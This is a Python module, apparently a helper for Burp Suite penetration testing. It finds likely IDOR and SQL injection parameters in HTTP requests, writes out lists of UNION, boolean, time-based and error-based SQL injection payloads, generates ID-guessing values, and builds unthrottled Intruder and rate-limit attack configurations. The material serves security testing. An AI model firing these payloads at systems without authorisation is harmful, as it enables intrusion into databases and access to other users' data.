"""
Burp Suite Repeater and Intruder Advanced Testing Module
Handles IDOR, SQL Injection, and Fuzzing attack configuration and execution.
"""

import json
import os
import subprocess
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, asdict
import hashlib
import time


@dataclass
class IDORPayload:
    """Represents an IDOR test payload"""
    parameter: str
    original_value: str
    test_value: str
    payload_type: str  # "sequential", "hash", "uuid", "timestamp"
    description: str


@dataclass
class SQLiPayload:
    """Represents a SQLi test payload"""
    parameter: str
    payload: str
    payload_type: str  # "union", "boolean", "time", "error"
    encoding: str  # "url", "html", "none"
    description: str


class IDORTester:
    """IDOR (Insecure Direct Object Reference) vulnerability testing"""
    
    def __init__(self, wordlist_dir: str = "/opt/burp-wordlists"):
        self.wordlist_dir = Path(wordlist_dir)
        self.common_idor_parameters = [
            "id", "user_id", "account_id", "object_id", "doc_id", "order_id",
            "resource_id", "profile_id", "account", "user", "group_id",
            "team_id", "org_id", "project_id"
        ]
    
    def find_idor_parameters(self, request_text: str) -> List[str]:
        """Extract potential IDOR parameters from HTTP request"""
        import re
        parameters = []
        
        # Search in query string
        query_match = re.search(r'\?([^#]+)', request_text)
        if query_match:
            query_params = query_match.group(1).split('&')
            for param in query_params:
                key = param.split('=')[0]
                if any(idor_param in key.lower() for idor_param in self.common_idor_parameters):
                    parameters.append(key)
        
        # Search in JSON body
        try:
            json_match = re.search(r'({.*})', request_text)
            if json_match:
                json_data = json.loads(json_match.group(1))
                for key in json_data.keys():
                    if any(idor_param in key.lower() for idor_param in self.common_idor_parameters):
                        parameters.append(key)
        except:
            pass
        
        return list(set(parameters))
    
    def generate_sequential_payloads(
        self, 
        parameter: str, 
        original_value: str, 
        count: int = 100
    ) -> List[IDORPayload]:
        """Generate sequential numeric IDOR payloads"""
        payloads = []
        
        try:
            base_num = int(original_value)
        except ValueError:
            # Try to extract number from string
            import re
            match = re.search(r'\d+', original_value)
            if not match:
                return payloads
            base_num = int(match.group())
        
        for i in range(count):
            test_num = base_num + i
            payloads.append(IDORPayload(
                parameter=parameter,
                original_value=original_value,
                test_value=str(test_num),
                payload_type="sequential",
                description=f"Sequential ID increment: {test_num}"
            ))
        
        return payloads
    
    def generate_hash_payloads(
        self, 
        parameter: str, 
        original_value: str
    ) -> List[IDORPayload]:
        """Generate hash variation IDOR payloads"""
        payloads = []
        
        # Common hash-like variations
        variations = [
            original_value,
            original_value + "0",
            original_value + "1",
            original_value[:-1] if len(original_value) > 1 else original_value,
            original_value.lower(),
            original_value.upper(),
        ]
        
        for variant in variations:
            payloads.append(IDORPayload(
                parameter=parameter,
                original_value=original_value,
                test_value=variant,
                payload_type="hash",
                description=f"Hash variant: {variant[:20]}..."
            ))
        
        return payloads
    
    def generate_uuid_payloads(
        self, 
        parameter: str
    ) -> List[IDORPayload]:
        """Generate UUID pattern IDOR payloads"""
        common_uuids = [
            "00000000-0000-0000-0000-000000000000",
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
            "550e8400-e29b-41d4-a716-446655440000",
            "12345678-1234-5678-1234-567812345678",
        ]
        
        payloads = []
        for uuid in common_uuids:
            payloads.append(IDORPayload(
                parameter=parameter,
                original_value="<user_uuid>",
                test_value=uuid,
                payload_type="uuid",
                description=f"UUID pattern: {uuid}"
            ))
        
        return payloads
    
    def generate_timestamp_payloads(
        self, 
        parameter: str,
        original_timestamp: float = None
    ) -> List[IDORPayload]:
        """Generate timestamp-based IDOR payloads"""
        if original_timestamp is None:
            original_timestamp = time.time()
        
        payloads = []
        # Generate IDs based on time deltas
        for delta in [0, -1, -3600, -86400, 1, 3600, 86400]:  # seconds
            test_time = int(original_timestamp + delta)
            payloads.append(IDORPayload(
                parameter=parameter,
                original_value=str(int(original_timestamp)),
                test_value=str(test_time),
                payload_type="timestamp",
                description=f"Timestamp-based ID (delta {delta}s)"
            ))
        
        return payloads
    
    def load_wordlist_payloads(self, parameter: str) -> List[IDORPayload]:
        """Load IDOR test values from wordlist"""
        payloads = []
        wordlist_path = self.wordlist_dir / "discovery" / "common.txt"
        
        if not wordlist_path.exists():
            return payloads
        
        try:
            with open(wordlist_path, 'r') as f:
                for line in f:
                    value = line.strip()
                    if value:
                        payloads.append(IDORPayload(
                            parameter=parameter,
                            original_value="<original>",
                            test_value=value,
                            payload_type="wordlist",
                            description=f"Wordlist value: {value}"
                        ))
        except Exception as e:
            print(f"Error loading wordlist: {e}")
        
        return payloads[:100]  # Limit to 100 payloads


class SQLiTester:
    """SQL Injection vulnerability testing"""
    
    def __init__(self, wordlist_dir: str = "/opt/burp-wordlists"):
        self.wordlist_dir = Path(wordlist_dir)
        self.common_sqli_parameters = [
            "id", "search", "q", "query", "filter", "username", "email",
            "name", "category", "type", "page", "sort", "order",
            "user", "account", "group", "lang", "product"
        ]
        
        self.basic_payloads = {
            "union": [
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL,NULL --",
                "' UNION SELECT version(),NULL,NULL --",
                "' UNION SELECT user(),database(),version() --",
            ],
            "boolean": [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            ],
            "time": [
                "' AND SLEEP(5) --",
                "' AND BENCHMARK(50000000, ENCODE('MSG','by 5 seconds')) --",
                "'; WAITFOR DELAY '00:00:05' --",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            ],
            "error": [
                "' AND extractvalue(rand(),concat(0x3a,version())) --",
                "' AND updatexml(rand(),concat(0x3a,version()),1) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a),FLOOR(RAND(0)*2))x GROUP BY x) --",
            ]
        }
    
    def find_sqli_parameters(self, request_text: str) -> List[str]:
        """Extract potential SQL injection parameters from HTTP request"""
        import re
        parameters = []
        
        # Search in query string
        query_match = re.search(r'\?([^#]+)', request_text)
        if query_match:
            query_params = query_match.group(1).split('&')
            for param in query_params:
                key = param.split('=')[0]
                if any(sqli_param in key.lower() for sqli_param in self.common_sqli_parameters):
                    parameters.append(key)
        
        # Search in JSON body
        try:
            json_match = re.search(r'({.*})', request_text)
            if json_match:
                json_data = json.loads(json_match.group(1))
                for key in json_data.keys():
                    if any(sqli_param in key.lower() for sqli_param in self.common_sqli_parameters):
                        parameters.append(key)
        except:
            pass
        
        return list(set(parameters))
    
    def generate_basic_payloads(
        self, 
        parameter: str,
        payload_type: str = "all"
    ) -> List[SQLiPayload]:
        """Generate basic SQL injection payloads"""
        payloads = []
        
        types_to_use = [payload_type] if payload_type != "all" else self.basic_payloads.keys()
        
        for ptype in types_to_use:
            if ptype not in self.basic_payloads:
                continue
            
            for payload in self.basic_payloads[ptype]:
                payloads.append(SQLiPayload(
                    parameter=parameter,
                    payload=payload,
                    payload_type=ptype,
                    encoding="url",
                    description=f"{ptype.upper()} SQLi: {payload[:40]}..."
                ))
        
        return payloads
    
    def generate_timing_payloads(
        self, 
        parameter: str,
        delay: int = 5
    ) -> List[SQLiPayload]:
        """Generate time-based blind SQLi payloads"""
        payloads = []
        
        timing_payloads = [
            f"' AND SLEEP({delay}) --",
            f"' AND BENCHMARK(100000000, ENCODE('MSG','by')) --",
            f"'; WAITFOR DELAY '00:00:{delay:02d}' --",
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a) --",
            f"' UNION SELECT SLEEP({delay}) --",
        ]
        
        for payload in timing_payloads:
            payloads.append(SQLiPayload(
                parameter=parameter,
                payload=payload,
                payload_type="time",
                encoding="url",
                description=f"Time-based blind SQLi (delay {delay}s)"
            ))
        
        return payloads
    
    def load_wordlist_payloads(self, parameter: str) -> List[SQLiPayload]:
        """Load SQLi payloads from wordlist files"""
        payloads = []
        wordlist_files = [
            "vulnerabilities/sql_inj.txt",
            "vulnerabilities/sql.txt",
            "vulnerabilities/all_attacks.txt",
        ]
        
        for wl_file in wordlist_files:
            wl_path = self.wordlist_dir / wl_file
            if not wl_path.exists():
                continue
            
            try:
                with open(wl_path, 'r') as f:
                    for line in f:
                        payload_text = line.strip()
                        if payload_text and not payload_text.startswith('#'):
                            payloads.append(SQLiPayload(
                                parameter=parameter,
                                payload=payload_text,
                                payload_type="wordlist",
                                encoding="url",
                                description=f"Wordlist SQLi: {payload_text[:40]}..."
                            ))
            except Exception as e:
                print(f"Error loading wordlist {wl_path}: {e}")
        
        return payloads[:200]  # Limit to 200 payloads
    
    def detect_timing_based_sqli(
        self,
        parameter: str,
        baseline_time: float,
        response_time: float,
        threshold: float = 2.0
    ) -> Tuple[bool, float]:
        """
        Detect time-based blind SQLi vulnerability.
        Returns (is_vulnerable, confidence_score)
        """
        delay_ratio = response_time / baseline_time if baseline_time > 0 else 0
        
        # If response took significantly longer, likely vulnerable
        is_vulnerable = response_time > (baseline_time + 4.0)  # At least ~5 second difference
        
        confidence = min(100, max(0, (delay_ratio - threshold) * 50))
        
        return is_vulnerable, confidence


class BurpIntruderConfig:
    """Generate Burp Intruder attack configurations"""
    
    def __init__(self, wordlist_dir: str = "/opt/burp-wordlists"):
        self.wordlist_dir = Path(wordlist_dir)
    
    def generate_intruder_attack(
        self,
        target_url: str,
        parameter: str,
        wordlist_path: str,
        attack_type: str = "Sniper",
        threads: int = 10,
        encoding: str = "URL",
        result_filter: Optional[str] = None
    ) -> Dict:
        """Generate Intruder attack configuration"""
        
        return {
            "target": {
                "url": target_url,
                "parameter": parameter,
            },
            "attack": {
                "type": attack_type,  # Sniper, Battering Ram, Pitchfork, Cluster Bomb
                "wordlist": wordlist_path,
                "threads": threads,
                "timeout": 30,
                "payload_encoding": encoding,
                "result_filter": result_filter or "status_code:!404",
            },
            "timing": {
                "request_delay_ms": 0,
                "throttle": False,
            }
        }
    
    def generate_rate_limit_attack(
        self,
        target_url: str,
        parameter: str,
        num_requests: int = 100
    ) -> Dict:
        """Generate rate limit testing attack"""
        return {
            "target": {
                "url": target_url,
                "parameter": parameter,
            },
            "attack": {
                "type": "Battering Ram",
                "num_requests": num_requests,
                "threads": 50,
                "timeout": 30,
                "result_filter": "status_code:429|status_code:503|contains:rate",
            },
            "analysis": {
                "track_response_time": True,
                "detect_patterns": True,
                "metrics": ["status_code", "response_time", "response_size"]
            }
        }
    
    def list_available_wordlists(self) -> Dict[str, List[str]]:
        """List available wordlist files by category"""
        wordlists = {}
        
        if not self.wordlist_dir.exists():
            return wordlists
        
        for category_dir in self.wordlist_dir.iterdir():
            if category_dir.is_dir():
                files = [f.name for f in category_dir.glob("*.txt")]
                if files:
                    wordlists[category_dir.name] = files
        
        return wordlists


class BurpRepeaterHelper:
    """Helper for Burp Repeater manual testing"""
    
    def __init__(self):
        self.idor_tester = IDORTester()
        self.sqli_tester = SQLiTester()
    
    def analyze_request(self, request_text: str) -> Dict:
        """Analyze HTTP request for testable parameters"""
        analysis = {
            "potential_idor_params": self.idor_tester.find_idor_parameters(request_text),
            "potential_sqli_params": self.sqli_tester.find_sqli_parameters(request_text),
        }
        return analysis
    
    def generate_idor_test_requests(
        self,
        base_request: str,
        parameter: str,
        original_value: str
    ) -> List[Tuple[str, str]]:
        """Generate multiple IDOR test requests (modified_request, description)"""
        test_requests = []
        
        # Generate different types of payloads
        all_payloads = []
        all_payloads.extend(self.idor_tester.generate_sequential_payloads(parameter, original_value))
        all_payloads.extend(self.idor_tester.generate_hash_payloads(parameter, original_value))
        all_payloads.extend(self.idor_tester.generate_uuid_payloads(parameter))
        
        for payload in all_payloads[:20]:  # Limit to 20 requests for manual testing
            modified_request = base_request.replace(
                f"{parameter}={original_value}",
                f"{parameter}={payload.test_value}"
            )
            test_requests.append((modified_request, payload.description))
        
        return test_requests
    
    def generate_sqli_test_requests(
        self,
        base_request: str,
        parameter: str,
        payload_type: str = "all"
    ) -> List[Tuple[str, str]]:
        """Generate SQLi test requests"""
        test_requests = []
        
        payloads = self.sqli_tester.generate_basic_payloads(parameter, payload_type)
        
        for payload in payloads[:15]:  # Limit to 15 requests for manual testing
            # Try both as parameter value and append to URL
            modified_request = base_request.replace(
                f"{parameter}=",
                f"{parameter}="
            )
            # More sophisticated replacement...
            import re
            pattern = rf"{parameter}=([^&\s]+)"
            modified_request = re.sub(pattern, f"{parameter}={payload.payload}", base_request)
            
            test_requests.append((modified_request, payload.description))
        
        return test_requests


# Export main classes
__all__ = [
    "IDORPayload",
    "SQLiPayload",
    "IDORTester",
    "SQLiTester",
    "BurpIntruderConfig",
    "BurpRepeaterHelper",
]
